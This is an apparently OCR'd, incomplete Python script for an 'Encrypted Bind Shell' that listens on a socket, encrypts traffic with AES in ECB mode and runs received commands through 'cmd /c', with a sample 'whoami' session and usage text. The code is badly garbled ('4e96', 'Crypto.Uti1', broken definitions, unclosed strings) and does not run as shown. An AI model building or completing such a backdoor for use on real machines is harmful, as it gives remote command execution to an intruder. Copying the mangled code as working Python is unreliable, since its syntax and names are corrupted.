#Project #5 - Encrypted Bind Shell 
#not_complete
""" simple preview
python project5. py -c 127.0.0.1
[ -- Connecting to bind shell! --]

[- Connected! -- ]
Enter Comand>whoami
desktop-eijvnq3\neutr

""""
import socket, subprocess, threading, argparse
from Crypto.Cipher import AES
from Crypto. Random import get_random_bytes
from Crypto.Uti1.Padding import pad, unpad
DEFAULT_PORT = 1234
MAX_BUFFER = 4e96
class AESCipher:
def key=None):
self. key = key if key else get_random_bytes(32)
self.cipher = AES.new(seLf. key, AES.MODE_ECB)
def encrypt(self, plaintext):
return self.cipher.encrypt(pad(plaintext, AES. block_siz
def execute_cmd(cmd) :
try:
= subprocess.check_output("cmd /c f}" . format(cmd
output
except :
= b"Command failed! "
output
return output
def :
return s.decode("latin-l").strip()
def shell_thread(s):
s.send(b" [ -- Connected! --])
try:
while True:
s.send(b"\r\nEnter Command>

"""
project5 encrypted.py
usage: project5_encrypted.py [ -h] [-1] [-c CONNECTI [ -k KEY]
optional arguments:
-h, --help   show this help message and exit
-l,  --listen Setup a bind shell

-c CONNECT,  --connect CONNECT
                                             Connect to a bind shell

-k KEY, - -key - -connect KEY  Encryption key


ex: python project5_encrypted.py -l


"""

#only a screenshot to ocr in this time.
#10 min of 27min.
